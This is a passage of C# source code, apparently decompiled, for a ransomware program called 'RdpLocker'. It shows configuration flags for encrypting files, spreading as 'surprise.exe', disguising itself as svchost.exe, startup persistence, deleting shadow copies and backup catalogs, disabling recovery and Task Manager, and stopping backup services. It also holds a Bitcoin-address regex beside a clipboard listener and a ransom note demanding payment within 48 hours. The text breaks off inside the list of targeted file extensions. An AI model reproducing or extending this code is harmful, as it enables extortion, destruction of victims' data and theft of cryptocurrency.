using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "rdplocked";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"--- RdpLocker ---", "", "Introducing RdpLocker, the cutting-edge solution for intermittent encryption.", "With intermittent encryption, it is undetectable and can encrypt terabytes of data", "in just a few minutes", "", "A unique public and private key is generated exclusively for you. No one else can decrypt the files we have encrytped.", "", "Our services are cheap and reliable. We are not politically motivated all we want is your money.", "",
		"To negotiate our prices and for further conatact and information please download qTox from ", "https://qtox.github.io", "", "and add us through our id", "CE93C52BFAFA16570B9821C7D0EE7999C78475AD964ACEEF80767B653210D27E3CE6C88F61A5", "", "If payment is not negotiated and received in 48 hours your files will be published online and will remain permenantly encrypted.", "We will be waiting."
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
